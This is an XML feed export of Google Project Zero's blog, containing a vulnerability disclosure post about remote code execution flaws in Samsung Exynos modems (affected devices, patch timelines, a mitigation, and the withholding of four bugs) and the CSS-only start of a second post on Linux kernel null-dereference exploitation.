## ?xml
## @version
1.0
## @encoding
UTF-8
## ?xml-stylesheet
href="http://www.blogger.com/styles/atom.css" type="text/css"
## feed
## @xmlns
http://www.w3.org/2005/Atom
## @xmlns:openSearch
http://a9.com/-/spec/opensearchrss/1.0/
## @xmlns:blogger
http://schemas.google.com/blogger/2008
## @xmlns:georss
http://www.georss.org/georss
## @xmlns:gd
http://schemas.google.com/g/2005
## @xmlns:thr
http://purl.org/syndication/thread/1.0
## id
tag:blogger.com,1999:blog-4838136820032157985
## updated
07/04/2023 22:52:47
## category
## @term
windows
## title
## @type
text
## #text
Project Zero
## subtitle
## @type
html
## #text
News and updates from the Project Zero team at Google
## link
## -
## @rel
http://schemas.google.com/g/2005#feed
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/posts/default
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/
## -
## @rel
hub
## @href
http://pubsubhubbub.appspot.com/
## -
## @rel
next
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default?start-index=26&max-results=25
## author
## name
Unknown
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## generator
## @version
7.00
## @uri
http://www.blogger.com
## #text
Blogger
## openSearch:totalResults
209
## openSearch:startIndex
1
## openSearch:itemsPerPage
25
## entry
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-8686178874057357713
## published
16/03/2023 15:07:00
## updated
21/03/2023 18:47:22
## title
## @type
text
## #text
Multiple Internet to Baseband Remote Code Execution Vulnerabilities in Exynos Modems
## content
## @type
html
## #text
<style type="text/css">.lst-kix_iavizzpdbbty-5>li{counter-increment:lst-ctn-kix_iavizzpdbbty-5}ol.lst-kix_iavizzpdbbty-0{list-style-type:none}ol.lst-kix_iavizzpdbbty-4.start{counter-reset:lst-ctn-kix_iavizzpdbbty-4 0}ol.lst-kix_iavizzpdbbty-2{list-style-type:none}ol.lst-kix_iavizzpdbbty-1{list-style-type:none}ol.lst-kix_iavizzpdbbty-0.start{counter-reset:lst-ctn-kix_iavizzpdbbty-0 0}.lst-kix_pidqkndckybh-1>li:before{content:"\0025cb  "}.lst-kix_pidqkndckybh-2>li:before{content:"\0025a0  "}ol.lst-kix_iavizzpdbbty-7.start{counter-reset:lst-ctn-kix_iavizzpdbbty-7 0}.lst-kix_tkumn87s07hu-6>li:before{content:"\0025cf  "}.lst-kix_pidqkndckybh-0>li:before{content:"\0025cf  "}.lst-kix_tkumn87s07hu-5>li:before{content:"\0025a0  "}.lst-kix_tkumn87s07hu-4>li:before{content:"\0025cb  "}.lst-kix_tkumn87s07hu-3>li:before{content:"\0025cf  "}ul.lst-kix_pidqkndckybh-8{list-style-type:none}.lst-kix_tkumn87s07hu-0>li:before{content:"\0025cf  "}ul.lst-kix_tkumn87s07hu-0{list-style-type:none}ul.lst-kix_pidqkndckybh-7{list-style-type:none}ul.lst-kix_tkumn87s07hu-1{list-style-type:none}.lst-kix_iavizzpdbbty-6>li{counter-increment:lst-ctn-kix_iavizzpdbbty-6}ul.lst-kix_pidqkndckybh-6{list-style-type:none}ul.lst-kix_tkumn87s07hu-2{list-style-type:none}ul.lst-kix_pidqkndckybh-5{list-style-type:none}ul.lst-kix_tkumn87s07hu-3{list-style-type:none}.lst-kix_tkumn87s07hu-2>li:before{content:"\0025a0  "}ul.lst-kix_tkumn87s07hu-4{list-style-type:none}.lst-kix_pidqkndckybh-8>li:before{content:"\0025a0  "}ul.lst-kix_tkumn87s07hu-5{list-style-type:none}.lst-kix_tkumn87s07hu-1>li:before{content:"\0025cb  "}ul.lst-kix_tkumn87s07hu-6{list-style-type:none}ul.lst-kix_tkumn87s07hu-7{list-style-type:none}ol.lst-kix_iavizzpdbbty-5.start{counter-reset:lst-ctn-kix_iavizzpdbbty-5 0}ol.lst-kix_iavizzpdbbty-8.start{counter-reset:lst-ctn-kix_iavizzpdbbty-8 0}.lst-kix_pidqkndckybh-3>li:before{content:"\0025cf  "}ol.lst-kix_iavizzpdbbty-4{list-style-type:none}.lst-kix_iavizzpdbbty-1>li{counter-increment:lst-ctn-kix_iavizzpdbbty-1}ol.lst-kix_iavizzpdbbty-3{list-style-type:none}.lst-kix_iavizzpdbbty-4>li{counter-increment:lst-ctn-kix_iavizzpdbbty-4}ol.lst-kix_iavizzpdbbty-6{list-style-type:none}ol.lst-kix_iavizzpdbbty-5{list-style-type:none}ol.lst-kix_iavizzpdbbty-8{list-style-type:none}ol.lst-kix_iavizzpdbbty-1.start{counter-reset:lst-ctn-kix_iavizzpdbbty-1 0}ol.lst-kix_iavizzpdbbty-7{list-style-type:none}.lst-kix_pidqkndckybh-4>li:before{content:"\0025cb  "}ul.lst-kix_tkumn87s07hu-8{list-style-type:none}.lst-kix_pidqkndckybh-5>li:before{content:"\0025a0  "}.lst-kix_pidqkndckybh-6>li:before{content:"\0025cf  "}.lst-kix_sqy4x6nn8j70-7>li:before{content:"\0025cb  "}.lst-kix_pidqkndckybh-7>li:before{content:"\0025cb  "}.lst-kix_sqy4x6nn8j70-8>li:before{content:"\0025a0  "}.lst-kix_iavizzpdbbty-7>li:before{content:"" counter(lst-ctn-kix_iavizzpdbbty-7,lower-latin) ". "}.lst-kix_iavizzpdbbty-6>li:before{content:"" counter(lst-ctn-kix_iavizzpdbbty-6,decimal) ". "}.lst-kix_iavizzpdbbty-8>li:before{content:"" counter(lst-ctn-kix_iavizzpdbbty-8,lower-roman) ". "}.lst-kix_sqy4x6nn8j70-3>li:before{content:"\0025cf  "}ul.lst-kix_sqy4x6nn8j70-8{list-style-type:none}ul.lst-kix_sqy4x6nn8j70-7{list-style-type:none}.lst-kix_sqy4x6nn8j70-2>li:before{content:"\0025a0  "}.lst-kix_sqy4x6nn8j70-6>li:before{content:"\0025cf  "}ul.lst-kix_sqy4x6nn8j70-4{list-style-type:none}ul.lst-kix_sqy4x6nn8j70-3{list-style-type:none}.lst-kix_iavizzpdbbty-2>li{counter-increment:lst-ctn-kix_iavizzpdbbty-2}.lst-kix_iavizzpdbbty-4>li:before{content:"" counter(lst-ctn-kix_iavizzpdbbty-4,lower-latin) ". "}ul.lst-kix_sqy4x6nn8j70-6{list-style-type:none}.lst-kix_sqy4x6nn8j70-5>li:before{content:"\0025a0  "}ul.lst-kix_sqy4x6nn8j70-5{list-style-type:none}.lst-kix_iavizzpdbbty-5>li:before{content:"" counter(lst-ctn-kix_iavizzpdbbty-5,lower-roman) ". "}.lst-kix_iavizzpdbbty-7>li{counter-increment:lst-ctn-kix_iavizzpdbbty-7}ul.lst-kix_sqy4x6nn8j70-0{list-style-type:none}ul.lst-kix_sqy4x6nn8j70-2{list-style-type:none}ul.lst-kix_sqy4x6nn8j70-1{list-style-type:none}.lst-kix_sqy4x6nn8j70-4>li:before{content:"\0025cb  "}.lst-kix_iavizzpdbbty-0>li:before{content:"" counter(lst-ctn-kix_iavizzpdbbty-0,decimal) ". "}.lst-kix_iavizzpdbbty-3>li:before{content:"" counter(lst-ctn-kix_iavizzpdbbty-3,decimal) ". "}ul.lst-kix_pidqkndckybh-0{list-style-type:none}.lst-kix_iavizzpdbbty-2>li:before{content:"" counter(lst-ctn-kix_iavizzpdbbty-2,lower-roman) ". "}.lst-kix_iavizzpdbbty-1>li:before{content:"" counter(lst-ctn-kix_iavizzpdbbty-1,lower-latin) ". "}.lst-kix_iavizzpdbbty-3>li{counter-increment:lst-ctn-kix_iavizzpdbbty-3}.lst-kix_sqy4x6nn8j70-1>li:before{content:"\0025cb  "}ul.lst-kix_pidqkndckybh-4{list-style-type:none}ul.lst-kix_pidqkndckybh-3{list-style-type:none}ol.lst-kix_iavizzpdbbty-2.start{counter-reset:lst-ctn-kix_iavizzpdbbty-2 0}.lst-kix_sqy4x6nn8j70-0>li:before{content:"\0025cf  "}ul.lst-kix_pidqkndckybh-2{list-style-type:none}ul.lst-kix_pidqkndckybh-1{list-style-type:none}.lst-kix_iavizzpdbbty-0>li{counter-increment:lst-ctn-kix_iavizzpdbbty-0}ol.lst-kix_iavizzpdbbty-3.start{counter-reset:lst-ctn-kix_iavizzpdbbty-3 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_tkumn87s07hu-7>li:before{content:"\0025cb  "}.lst-kix_tkumn87s07hu-8>li:before{content:"\0025a0  "}ol.lst-kix_iavizzpdbbty-6.start{counter-reset:lst-ctn-kix_iavizzpdbbty-6 0}.lst-kix_iavizzpdbbty-8>li{counter-increment:lst-ctn-kix_iavizzpdbbty-8}ol{margin:0;padding:0}table td,table th{padding:0}.nAjVSlbajO-c2{margin-left:36pt;padding-top:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.nAjVSlbajO-c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.nAjVSlbajO-c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.nAjVSlbajO-c18{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.nAjVSlbajO-c10{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.nAjVSlbajO-c16{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.nAjVSlbajO-c6{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.nAjVSlbajO-c7{color:#000000;font-weight:400;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.nAjVSlbajO-c5{color:#000000;font-weight:400;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.nAjVSlbajO-c4{color:#000000;font-weight:700;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:italic}.nAjVSlbajO-c20{color:#000000;font-weight:400;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.nAjVSlbajO-c15{color:#000000;font-weight:400;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.nAjVSlbajO-c11{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.nAjVSlbajO-c8{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.nAjVSlbajO-c12{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline line-through}.nAjVSlbajO-c0{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;text-decoration:line-through}.nAjVSlbajO-c23{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.nAjVSlbajO-c22{padding:0;margin:0}.nAjVSlbajO-c9{color:inherit;text-decoration:inherit}.nAjVSlbajO-c24{font-weight:700}.nAjVSlbajO-c13{margin-left:36pt}.nAjVSlbajO-c19{height:11pt}.nAjVSlbajO-c14{font-style:italic}.nAjVSlbajO-c17{text-decoration:none}.nAjVSlbajO-c21{height:20pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c23 doc-content">
 <p class="nAjVSlbajO-c6"><span class="nAjVSlbajO-c14">Posted by Tim Willis, Project Zero</span></p>
 <p class="nAjVSlbajO-c1"><span class="nAjVSlbajO-c4 nAjVSlbajO-c17"></span></p>

 <p class="nAjVSlbajO-c6"><span class="nAjVSlbajO-c3">In late 2022 and early 2023, Project Zero reported eighteen 0-day vulnerabilities in Exynos Modems produced by Samsung Semiconductor. The four most severe of these eighteen vulnerabilities (CVE-2023-24033, CVE-2023-26496, CVE-2023-26497 and CVE-2023-26498) allowed for Internet-to-baseband remote code execution. Tests conducted by Project Zero confirm that those four vulnerabilities allow an attacker to remotely compromise a phone at the baseband level with no user interaction, and require only that the attacker know the victim&#39;s phone number. With limited additional research and development, we believe that skilled attackers would be able to quickly create an operational exploit to compromise affected devices silently and remotely.</span></p>
 <p class="nAjVSlbajO-c1"><span class="nAjVSlbajO-c3"></span></p>
 <p class="nAjVSlbajO-c6"><span class="nAjVSlbajO-c3">The fourteen other related vulnerabilities (CVE-2023-26072, CVE-2023-26073, CVE-2023-26074, CVE-2023-26075, CVE-2023-26076 and nine other vulnerabilities that are yet to be assigned CVE-IDs) were not as severe, as they require either a malicious mobile network operator or an attacker with local access to the device.</span></p><h2 class="nAjVSlbajO-c10" id="h.pizd28g4v1pz"><span class="nAjVSlbajO-c16">Affected devices</span></h2>
 <p class="nAjVSlbajO-c6"><span class="nAjVSlbajO-c8"><a class="nAjVSlbajO-c91" href="https://semiconductor.samsung.com/support/quality-support/product-security-updates/">Samsung Semiconductor&#39;s advisories</a></span><span class="nAjVSlbajO-c3">&nbsp;provide the list of Exynos chipsets that are affected by these vulnerabilities. Based on information from public websites that map chipsets to devices, affected products likely include:</span></p>
 <p class="nAjVSlbajO-c1"><span class="nAjVSlbajO-c3"></span></p><ul style="padding: 0;" class="c22 lst-kix_pidqkndckybh-0 start"><li style="margin-left: 46pt;" class="c2 li-bullet-0"><span class="nAjVSlbajO-c3">Mobile devices from Samsung, including those in the S22, M33, M13, M12, A71, A53, A33, A21s, A13, A12 and A04 series;</span></li><li style="margin-left: 46pt;" class="c2 li-bullet-0"><span class="nAjVSlbajO-c3">Mobile devices from Vivo, including those in the S16, S15, S6, X70, X60 and X30 series;</span></li><li style="margin-left: 46pt;" class="c2 li-bullet-0"><span class="nAjVSlbajO-c3">The Pixel 6 and Pixel 7 series of devices from Google; and</span></li><li style="margin-left: 46pt;" class="c2 li-bullet-0"><span class="nAjVSlbajO-c3">any vehicles that use the Exynos Auto T5123 chipset.</span></li></ul>
 <p class="nAjVSlbajO-c1"><span class="nAjVSlbajO-c3"></span></p><h2 class="nAjVSlbajO-c10" id="h.266y8s5a0j0v"><span class="nAjVSlbajO-c16">Patch timelines</span></h2>
 <p class="nAjVSlbajO-c6"><span>We expect that patch timelines will vary per manufacturer (for example, affected Pixel devices have received a fix for all four of the severe Internet-to-baseband remote code execution vulnerabilities in the </span><span class="nAjVSlbajO-c8"><a class="nAjVSlbajO-c91" href="https://source.android.com/docs/security/bulletin/pixel/2023-03-01">March 2023</a></span><span class="nAjVSlbajO-c3">&nbsp;security update). In the meantime, users with affected devices can protect themselves from the baseband remote code execution vulnerabilities mentioned in this post by turning off Wi-Fi calling and Voice-over-LTE (VoLTE) in their device settings, although your ability to change this setting can be dependent on your carrier. As always, we encourage end users to update their devices as soon as possible, to ensure that they are running the latest builds that fix both disclosed and undisclosed security vulnerabilities.</span></p><h2 class="nAjVSlbajO-c10" id="h.ly3d3qye8ims"><span class="nAjVSlbajO-c16">Four vulnerabilities being withheld from disclosure</span></h2>
 <p class="nAjVSlbajO-c6"><span class="nAjVSlbajO-c3">Under our standard disclosure policy, Project Zero discloses security vulnerabilities to the public a set time after reporting them to a software or hardware vendor. In some rare cases where we have assessed attackers would benefit significantly more than defenders if a vulnerability was disclosed, we have made an exception to our policy and delayed disclosure of that vulnerability.</span></p>
 <p class="nAjVSlbajO-c1"><span class="nAjVSlbajO-c3"></span></p>
 <p class="nAjVSlbajO-c11"><span>Due to a very rare combination of level of access these vulnerabilities provide and the speed with which we believe a reliable operational exploit could be crafted, we have decided to make a policy exception to delay disclosure for the four vulnerabilities that allow for Internet-to-baseband remote code execution. We will continue our history of transparency by </span><span class="nAjVSlbajO-c8"><a class="nAjVSlbajO-c91" href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html#exceptions">publicly sharing disclosure policy exceptions</a></span><span class="nAjVSlbajO-c3">, and will add these issues to that list once they are all disclosed.</span></p><h2 class="nAjVSlbajO-c10" id="h.21040ne9k0g4"><span class="nAjVSlbajO-c16">Related vulnerabilities not being withheld</span></h2><p class="nAjVSlbajO-c6"><span class="nAjVSlbajO-c3">Of the remaining fourteen vulnerabilities, we are disclosing four vulnerabilities (CVE-2023-26072, CVE-2023-26073, CVE-2023-26074 and CVE-2023-26075) that have exceeded Project Zero&#39;s standard 90-day deadline today. These issues have been publicly disclosed in our <span class="nAjVSlbajO-c8"><a class="nAjVSlbajO-c91" href="https://bugs.chromium.org/p/project-zero/issues/list?sort=-id&q=&can=1">issue tracker</a></span>, as they do not meet the high standard to be withheld from disclosure. The remaining ten vulnerabilities in this set have not yet hit their 90-day deadline, but will be publicly disclosed at that point if they are still unfixed.</span></p>
 <p class="nAjVSlbajO-c1"><span class="nAjVSlbajO-c3"></span></p><h2 class="nAjVSlbajO-c10" id="h.pizd28g4v1pz"><span class="nAjVSlbajO-c16">Changelog</span></h2>
    <p class="nAjVSlbajO-c6"><span class="nAjVSlbajO-c3"><b>2023-03-21</b>: Removed note at the top of the blog as patches are more widely available for the four severe vulnerabilities. Added additional context that some carriers can control the Wifi calling and VoLTE settings, overriding the ability for some users to change this setting.</span></p>
  <p class="nAjVSlbajO-c6"><span class="nAjVSlbajO-c3"><b>2023-03-20</b>: Google Pixel updated their <a class="nAjVSlbajO-c91" href="https://source.android.com/docs/security/bulletin/pixel/2023-03-01">March 2023 Security Bulletin</a> to now show that all four Internet-to-baseband remote code execution vulnerabilities were fixed for Pixel 6 and Pixel 7 in the March 2023 update, not just one of the vulnerabilities, as originally stated.</span></p>
 <p class="nAjVSlbajO-c6"><span class="nAjVSlbajO-c3"><b>2023-03-20</b>: Samsung Semiconductor<a class="nAjVSlbajO-c91" href="https://semiconductor.samsung.com/support/quality-support/product-security-updates/"> updated their advisories</a> to include three new CVE-IDs, that correspond to the three other Internet-to-baseband remote code execution issues (CVE-2023-26496, CVE-2023-26497 and CVE-2023-26498). The blogpost text was updated to reflect these new CVE-IDs.</span></p>
 <p class="nAjVSlbajO-c6"><span class="nAjVSlbajO-c3"><b>2023-03-17</b>: Samsung Semiconductor<a class="nAjVSlbajO-c91" href="https://semiconductor.samsung.com/support/quality-support/product-security-updates/"> updated their advisories</a> to remove Exynos W920 as an affected chipset, so we have removed it from the "Affected devices" section.</span></p>
 <p class="nAjVSlbajO-c6"><span class="nAjVSlbajO-c3"><b>2023-03-17</b>: Samsung Mobile advised us that the A21s is the correct affected device, not the A21 as originally stated.</span></p>
 <p class="nAjVSlbajO-c6"><span class="nAjVSlbajO-c3"><b>2023-03-17</b>: Four of the fourteen less severe vulnerabilities hit their 90-day deadline at the time of publication, not five, as originally stated.</span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/8686178874057357713/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2023/03/multiple-internet-to-baseband-remote-rce.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/8686178874057357713
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/8686178874057357713
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2023/03/multiple-internet-to-baseband-remote-rce.html
## @title
Multiple Internet to Baseband Remote Code Execution Vulnerabilities in Exynos Modems
## author
## name
Google Project Zero
## uri
http://www.blogger.com/profile/08975904405228580347
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-6288849578901159797
## published
19/01/2023 14:33:00
## updated
19/01/2023 14:33:48
## title
## @type
text
## #text
Exploiting null-dereferences in the Linux kernel
## content
## @type
html
## #text
<style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol.lst-kix_3558t16xb2i9-3.start{counter-reset:lst-ctn-kix_3558t16xb2i9-3 0}.lst-kix_dt3x5t4funnl-8>li:before{content:"" counter(lst-ctn-kix_dt3x5t4funnl-8,lower-roman) ". "}ol.lst-kix_ehkygwr8rii2-3.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-3 0}ol.lst-kix_dt3x5t4funnl-6.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-6 0}.lst-kix_3558t16xb2i9-5>li{counter-increment:lst-ctn-kix_3558t16xb2i9-5}.lst-kix_dt3x5t4funnl-7>li:before{content:"" counter(lst-ctn-kix_dt3x5t4funnl-7,lower-latin) ". "}.lst-kix_dt3x5t4funnl-1>li{counter-increment:lst-ctn-kix_dt3x5t4funnl-1}.lst-kix_dt3x5t4funnl-2>li:before{content:"" counter(lst-ctn-kix_dt3x5t4funnl-2,lower-roman) ". "}.lst-kix_ehkygwr8rii2-5>li{counter-increment:lst-ctn-kix_ehkygwr8rii2-5}.lst-kix_dt3x5t4funnl-1>li:before{content:"" counter(lst-ctn-kix_dt3x5t4funnl-1,lower-latin) ". "}ol.lst-kix_3558t16xb2i9-6.start{counter-reset:lst-ctn-kix_3558t16xb2i9-6 0}.lst-kix_dt3x5t4funnl-2>li{counter-increment:lst-ctn-kix_dt3x5t4funnl-2}ol.lst-kix_ehkygwr8rii2-6.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-6 0}ol.lst-kix_gx9cg4br20pa-1.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-1 0}.lst-kix_dt3x5t4funnl-3>li:before{content:"" counter(lst-ctn-kix_dt3x5t4funnl-3,decimal) ". "}.lst-kix_dt3x5t4funnl-4>li:before{content:"" counter(lst-ctn-kix_dt3x5t4funnl-4,lower-latin) ". "}.lst-kix_dt3x5t4funnl-6>li:before{content:"" counter(lst-ctn-kix_dt3x5t4funnl-6,decimal) ". "}.lst-kix_3558t16xb2i9-8>li:before{content:"" counter(lst-ctn-kix_3558t16xb2i9-8,lower-roman) ". "}.lst-kix_dt3x5t4funnl-5>li:before{content:"" counter(lst-ctn-kix_dt3x5t4funnl-5,lower-roman) ". "}.lst-kix_3558t16xb2i9-5>li:before{content:"" counter(lst-ctn-kix_3558t16xb2i9-5,lower-roman) ". "}.lst-kix_dt3x5t4funnl-0>li{counter-increment:lst-ctn-kix_dt3x5t4funnl-0}.lst-kix_3558t16xb2i9-3>li:before{content:"" counter(lst-ctn-kix_3558t16xb2i9-3,decimal) ". "}.lst-kix_3558t16xb2i9-7>li:before{content:"" counter(lst-ctn-kix_3558t16xb2i9-7,lower-latin) ". "}.lst-kix_dt3x5t4funnl-3>li{counter-increment:lst-ctn-kix_dt3x5t4funnl-3}.lst-kix_3558t16xb2i9-6>li{counter-increment:lst-ctn-kix_3558t16xb2i9-6}.lst-kix_3558t16xb2i9-2>li:before{content:"" counter(lst-ctn-kix_3558t16xb2i9-2,lower-roman) ". "}.lst-kix_3558t16xb2i9-6>li:before{content:"" counter(lst-ctn-kix_3558t16xb2i9-6,decimal) ". "}ol.lst-kix_gx9cg4br20pa-4.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-4 0}.lst-kix_3558t16xb2i9-4>li:before{content:"" counter(lst-ctn-kix_3558t16xb2i9-4,lower-latin) ". "}ol.lst-kix_ehkygwr8rii2-1{list-style-type:none}.lst-kix_3558t16xb2i9-4>li{counter-increment:lst-ctn-kix_3558t16xb2i9-4}.lst-kix_gx9cg4br20pa-7>li{counter-increment:lst-ctn-kix_gx9cg4br20pa-7}ol.lst-kix_ehkygwr8rii2-0{list-style-type:none}ol.lst-kix_ehkygwr8rii2-3{list-style-type:none}ol.lst-kix_3558t16xb2i9-0.start{counter-reset:lst-ctn-kix_3558t16xb2i9-0 0}ol.lst-kix_ehkygwr8rii2-2{list-style-type:none}ol.lst-kix_ehkygwr8rii2-5{list-style-type:none}ol.lst-kix_ehkygwr8rii2-4{list-style-type:none}ol.lst-kix_ehkygwr8rii2-7{list-style-type:none}.lst-kix_ehkygwr8rii2-3>li{counter-increment:lst-ctn-kix_ehkygwr8rii2-3}ol.lst-kix_ehkygwr8rii2-6{list-style-type:none}.lst-kix_3558t16xb2i9-1>li:before{content:"" counter(lst-ctn-kix_3558t16xb2i9-1,lower-latin) ". "}ol.lst-kix_ehkygwr8rii2-8{list-style-type:none}.lst-kix_ehkygwr8rii2-6>li{counter-increment:lst-ctn-kix_ehkygwr8rii2-6}ol.lst-kix_gx9cg4br20pa-7.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-7 0}.lst-kix_3558t16xb2i9-0>li:before{content:"" counter(lst-ctn-kix_3558t16xb2i9-0,decimal) ". "}.lst-kix_3558t16xb2i9-2>li{counter-increment:lst-ctn-kix_3558t16xb2i9-2}ol.lst-kix_3558t16xb2i9-8.start{counter-reset:lst-ctn-kix_3558t16xb2i9-8 0}ol.lst-kix_ehkygwr8rii2-8.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-8 0}.lst-kix_ehkygwr8rii2-8>li{counter-increment:lst-ctn-kix_ehkygwr8rii2-8}.lst-kix_gx9cg4br20pa-1>li{counter-increment:lst-ctn-kix_gx9cg4br20pa-1}ol.lst-kix_dt3x5t4funnl-8.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-8 0}.lst-kix_dt3x5t4funnl-5>li{counter-increment:lst-ctn-kix_dt3x5t4funnl-5}ol.lst-kix_gx9cg4br20pa-8{list-style-type:none}ol.lst-kix_dt3x5t4funnl-1.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-1 0}ol.lst-kix_gx9cg4br20pa-4{list-style-type:none}ol.lst-kix_gx9cg4br20pa-5{list-style-type:none}ol.lst-kix_3558t16xb2i9-1.start{counter-reset:lst-ctn-kix_3558t16xb2i9-1 0}ol.lst-kix_gx9cg4br20pa-3.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-3 0}ol.lst-kix_gx9cg4br20pa-6{list-style-type:none}ol.lst-kix_gx9cg4br20pa-7{list-style-type:none}ol.lst-kix_gx9cg4br20pa-0{list-style-type:none}ol.lst-kix_gx9cg4br20pa-1{list-style-type:none}.lst-kix_gx9cg4br20pa-5>li{counter-increment:lst-ctn-kix_gx9cg4br20pa-5}ol.lst-kix_gx9cg4br20pa-2{list-style-type:none}ol.lst-kix_gx9cg4br20pa-3{list-style-type:none}ol.lst-kix_ehkygwr8rii2-1.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-1 0}.lst-kix_gx9cg4br20pa-8>li{counter-increment:lst-ctn-kix_gx9cg4br20pa-8}ol.lst-kix_dt3x5t4funnl-0.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-0 0}ol.lst-kix_dt3x5t4funnl-7.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-7 0}ol.lst-kix_ehkygwr8rii2-7.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-7 0}.lst-kix_dt3x5t4funnl-0>li:before{content:"" counter(lst-ctn-kix_dt3x5t4funnl-0,decimal) ". "}ol.lst-kix_ehkygwr8rii2-0.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-0 0}ol.lst-kix_gx9cg4br20pa-2.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-2 0}.lst-kix_ehkygwr8rii2-2>li{counter-increment:lst-ctn-kix_ehkygwr8rii2-2}ol.lst-kix_3558t16xb2i9-2.start{counter-reset:lst-ctn-kix_3558t16xb2i9-2 0}.lst-kix_3558t16xb2i9-8>li{counter-increment:lst-ctn-kix_3558t16xb2i9-8}ol.lst-kix_gx9cg4br20pa-5.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-5 0}.lst-kix_ehkygwr8rii2-8>li:before{content:"" counter(lst-ctn-kix_ehkygwr8rii2-8,lower-roman) ". "}.lst-kix_dt3x5t4funnl-7>li{counter-increment:lst-ctn-kix_dt3x5t4funnl-7}.lst-kix_ehkygwr8rii2-7>li:before{content:"" counter(lst-ctn-kix_ehkygwr8rii2-7,lower-latin) ". "}.lst-kix_gx9cg4br20pa-3>li{counter-increment:lst-ctn-kix_gx9cg4br20pa-3}.lst-kix_ehkygwr8rii2-6>li:before{content:"" counter(lst-ctn-kix_ehkygwr8rii2-6,decimal) ". "}.lst-kix_ehkygwr8rii2-0>li{counter-increment:lst-ctn-kix_ehkygwr8rii2-0}.lst-kix_ehkygwr8rii2-5>li:before{content:"" 